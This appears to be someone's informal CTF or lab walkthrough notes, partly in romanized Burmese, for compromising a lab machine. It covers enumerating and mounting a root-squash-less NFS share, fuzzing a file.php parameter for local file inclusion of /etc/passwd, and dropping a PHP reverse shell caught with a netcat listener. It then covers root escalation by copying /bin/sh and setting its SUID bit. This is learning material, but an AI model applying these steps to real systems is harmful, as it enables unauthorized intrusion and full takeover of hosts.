
nmap -sV -sC 192.168.99.107

showmount -e 192.168.99.107   => bar twe sharing loke htar lal

=> i saw it
![[Pasted image 20230115204352.png]]


=> preparing for mount

mkdir /tmp/hack   

sudo mount 192.168.99.107:/mnt/nfs /tmp/hack

ls -al /tmp/hack   => go and check to this mount file

it's was running with root access

![[Pasted image 20230115204629.png]]


we run with root access like this

![[Pasted image 20230115204729.png]]

####### but now we can do nothing with this service 

------

=> Go check to web service 

gobuster dir -u "http://192.168.99.107/" -w /usr/share/dirb/wordlists/big.txt -x php,txt,zip,bak

-x  option ka extension ko pyaw dar



http://192.168.99.107/file.php?file=/etc/passwd    = we guess this param to get ( ?file )


*** we can try this way if we don't know how to search file path  or url path 

example  =>  192.168.99.107/file.php?aaa=/etc/passwd   => we don't now url path aaa is example

wfuzz -w /usr/share/dirb/wordlists/big.txt http://192.168.99.107/file.php?FUZZ=/etc/passwd  => we replace aaa -> FUZZ => to brute force     **** ma lot det har dwe myar nay dl

wfuzz -w /usr/share/dirb/wordlists/big.txt --hw 14 http://192.168.99.107/file.php?FUZZ=/etc/passwd   => we do this command cuzz --hw is remove like below word  => like 14 W

![[Pasted image 20230115211813.png]]


Here is result => without 14

![[Pasted image 20230115211849.png]]

So we use like this => abusing haha

![[Pasted image 20230115212001.png]]


We using that before we got file path

![[Pasted image 20230115212133.png]]


and then we download php reverse shell 

and then change the shell file name with this command

mv php-reverse-shell.php shell.php   **

and then we go to /tmp/hack     => for mount

and then copy the shell file => cp /home/kali/Desktop/hackdudo2/shell.php .   => . mean current folder

=> server mar => nc -lvp 4444  
=> client mar
![[Pasted image 20230115213330.png]]


User done #######

-----

rooting

we change to 777 permission to flag1.txt cuz this service was running with root permission

![[Pasted image 20230115213955.png]]

sh shell ko copy htal like dal

cp /bin/sh .   

chmod 777 sh

chmod +s sh   => sh file ko permission ma lo bal ya dal => but shell access ya nay ma ya mal

![[Pasted image 20230115214346.png]]

Before and After using chmod +s sh 

![[Pasted image 20230115214450.png]]


and then using python shell spawn to prevent from accident

python3 -c 'import pty; pty.spawn("/bin/sh")'



*****
suid error  ****

![[Pasted image 20230115233404.png]]
